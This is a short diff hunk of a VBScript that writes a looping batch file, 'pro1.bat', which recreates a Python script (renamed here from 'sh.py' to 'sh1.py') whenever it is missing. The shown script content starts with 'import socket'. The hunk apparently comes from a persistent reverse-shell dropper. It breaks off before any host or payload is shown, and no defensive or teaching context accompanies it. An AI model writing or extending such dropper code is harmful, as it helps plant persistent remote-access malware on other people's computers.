@@ -2,7 +2,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.CreateTextFile("pro1.bat")
 objFile.WriteLine "@echo off"
 objFile.WriteLine ":loop"
-objFile.WriteLine "set FILE=sh.py"
+objFile.WriteLine "set FILE=sh1.py"
 objFile.WriteLine "if not exist %FILE% ("
 objFile.WriteLine "    ("
 objFile.WriteLine "        echo import socket^"
